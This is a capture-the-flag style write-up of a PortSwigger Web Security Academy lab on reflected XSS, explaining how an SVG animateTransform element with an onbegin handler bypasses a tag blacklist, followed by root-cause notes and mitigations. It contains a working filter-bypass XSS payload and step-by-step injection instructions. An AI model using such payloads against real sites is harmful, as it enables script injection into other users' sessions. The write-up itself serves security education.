# 🚨 Reflected XSS via SVG `animateTransform` — Write-up

## 🧪 Lab Details

* **Lab Name:** Reflected XSS with some SVG markup allowed
* **Difficulty:** Practitioner
* **Platform:** PortSwigger Web Security Academy
* **Category:** Reflected Cross-Site Scripting (XSS)

---

## 🧠 Vulnerability Overview

The application reflects user input from the search parameter into the HTML response.

* `<script>` and common tags are filtered ❌
* SVG elements and event handlers are still allowed ✅

This results in a **filter bypass using SVG-based XSS**.

---

## 🎯 Objective

Execute JavaScript via reflected input:

```
alert(document.domain)
```

---

## 💣 Payload (Working)

```
<svg>
  <animateTransform 
    attributeName="transform" 
    type="rotate" 
    values="0 0 0; 360 0 0" 
    onbegin="alert(document.domain)" 
  />
</svg>
```

---

## ⚔️ Exploitation Steps

1. Open the lab
2. Go to the search input field
3. Paste the payload
4. Submit the request

---

## 📊 Result

* Payload is reflected in response
* SVG is parsed by browser
* `onbegin` event executes automatically

```
alert(document.domain)
```

✅ Reflected XSS confirmed

---

## 🧨 Why It Works

* SVG tags are not filtered
* `animateTransform` supports event handlers
* `onbegin` triggers automatically
* No user interaction required

---

## 🔍 Root Cause

* Incomplete filtering (blacklist-based)
* SVG not sanitized
* Direct reflection of user input

---

## 🛡️ Mitigation

### 1. Proper Output Encoding

```
html.replace(/</g, "&lt;").replace(/>/g, "&gt;");
```

### 2. Avoid innerHTML

```
element.textContent = userInput;
```

### 3. Use Sanitization Libraries

* DOMPurify

### 4. Content Security Policy (CSP)

```
Content-Security-Policy: script-src 'self'
```

---

## 🧰 Tools Used

* Burp Suite
* Browser DevTools
* PortSwigger Web Security Academy

---

## ⚠️ Disclaimer

This write-up is for educational purposes only.
All testing was performed on intentionally vulnerable labs.

---

## 💡 Key Takeaway

Filter bypass is key — when `<script>` is blocked, SVG can be used to execute XSS.
